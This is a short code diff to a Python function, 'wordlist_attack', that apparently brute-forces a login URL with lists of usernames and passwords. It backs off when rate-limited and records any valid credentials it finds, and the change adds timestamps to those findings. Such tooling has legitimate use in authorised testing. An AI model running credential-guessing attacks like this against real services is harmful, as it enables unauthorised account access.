@@ -98,6 +98,7 @@ def wordlist_attack(session, url, usernames, passwords,
             stats: execution metrics
 
     """
+    attemot_times = []
     start_time = time.time()
     attempt_counter = 0
     findings = []
@@ -137,7 +138,7 @@ def wordlist_attack(session, url, usernames, passwords,
 
             if result == "success":
                 print(f"\n[!!!] Valid credentials found: {username}:{password}")
-                findings.append({"type": "valid_credentials", "username": username, "password": password})
+                findings.append({"type": "valid_credentials", "username": username, "password": password, "timestamp": time.time(), "time_in_seconds": time.time() - start_time})
 
             elif result == "ratelimited":
                 print(f"[~] Rate-limited — sleeping 30s")
